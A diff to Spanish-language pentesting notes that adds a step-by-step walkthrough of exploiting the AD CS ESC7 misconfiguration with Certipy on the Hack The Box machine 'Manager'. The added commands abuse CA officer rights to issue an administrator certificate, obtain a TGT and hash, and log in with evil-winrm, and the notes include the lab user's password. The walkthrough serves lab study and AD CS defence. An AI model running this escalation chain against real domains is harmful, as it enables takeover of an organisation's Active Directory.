@@ -3,6 +3,7 @@
 Certipy es una herramienta poderosa para interactuar con Active Directory Certificate Services (AD CS). Permite enumerar, solicitar y gestionar certificados, además de identificar configuraciones vulnerables que pueden ser explotadas.
 
 - [ESC9 ATTACK](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension)
+- [Hacktricks ESC-X](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html#vulnerable-certificate-authority-access-control-esc7)
 
 ## Instalación
 - Instalar con pipx: 
@@ -68,3 +69,100 @@ A continuación, se describe un ejemplo detallado para identificar y explotar un
     Esto proporcionará un hash NTLM del usuario `Administrator`.
 
 Este flujo permite explotar la vulnerabilidad ESC9 para obtener acceso privilegiado en el entorno AD CS.
+## Explotación de ESC7 con Certipy en la máquina Manager (HTB)
+
+- [Fuente oficial - ESC7 en Certipy](https://github.com/ly4k/Certipy?tab=readme-ov-file#esc7)
+
+**ESC7** es una vulnerabilidad que afecta a Active Directory Certificate Services (AD CS) cuando un usuario posee permisos peligrosos sobre una Autoridad Certificadora (CA). Si un usuario tiene permisos como `ManageCA` o `ManageCertificates`, puede abusar de esa configuración para emitir certificados arbitrarios, incluyendo certificados para cuentas de alto privilegio, como `Administrator`.
+
+A continuación, se detalla un ejemplo práctico sobre cómo explotar esta vulnerabilidad usando la herramienta `certipy`.
+
+---
+
+### 🔎 Detección de ESC7
+
+```bash
+certipy-ad find -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
+```
+
+**Resultado relevante:**
+```bash
+[!] Vulnerabilities
+  ESC7 : 'MANAGER.HTB\\Raven' has dangerous permissions
+```
+
+> Esto confirma que el usuario `Raven` tiene permisos como `ManageCA` sobre la CA `manager-DC01-CA`.
+
+---
+
+### ✅ Explotación de ESC7
+
+#### 1. Añadir al usuario como "officer" de la CA
+```bash
+certipy-ad ca -ca 'manager-DC01-CA' -add-officer raven \
+  -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
+```
+Esto otorga permisos de `ManageCertificates`, necesarios para aprobar solicitudes manualmente.
+
+#### 2. Habilitar plantilla vulnerable (SubCA)
+```bash
+certipy-ad ca -ca 'manager-DC01-CA' -enable-template 'SubCA' \
+  -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
+```
+
+#### 3. (Opcional) Listar plantillas activas
+```bash
+certipy-ad ca -ca 'manager-DC01-CA' -list-templates \
+  -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
+```
+
+#### 4. Solicitar un certificado como `administrator`
+```bash
+certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' \
+  -ca 'manager-DC01-CA' -template 'SubCA' \
+  -upn administrator@manager.htb -target manager.htb
+```
+Esto falla con error `CERTSRV_E_TEMPLATE_DENIED`, pero genera un `Request ID` y guarda la clave privada.
+
+#### 5. Volver a agregarse como officer (si fue revertido por el entorno)
+```bash
+certipy-ad ca -ca 'manager-DC01-CA' -add-officer raven \
+  -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
+```
+
+#### 6. Aprobar manualmente la solicitud usando el Request ID (ej. 19)
+```bash
+certipy-ad ca -ca 'manager-DC01-CA' -issue-request 19 \
+  -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'
+```
+
+#### 7. Descargar el certificado emitido
+```bash
+certipy-ad req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' \
+  -ca 'manager-DC01-CA' -retrieve 19
+```
+Esto genera `administrator.pfx`, un archivo que contiene el certificado y la clave privada.
+
+---
+
+### 🔑 Autenticación como Administrator
+
+#### 1. Obtener TGT usando el certificado
+```bash
+certipy-ad auth -pfx administrator.pfx
+```
+
+Si da error de "Clock Skew":
+```bash
+sudo ntpdate -s manager.htb
+```
+
+Repetir:
+```bash
+certipy-ad auth -pfx administrator.pfx
+```
+
+#### 2. Acceder a la máquina con Evil-WinRM usando el hash obtenido
+```bash
+evil-winrm -i manager.htb -u administrator -H <hash_obtenido>
+```
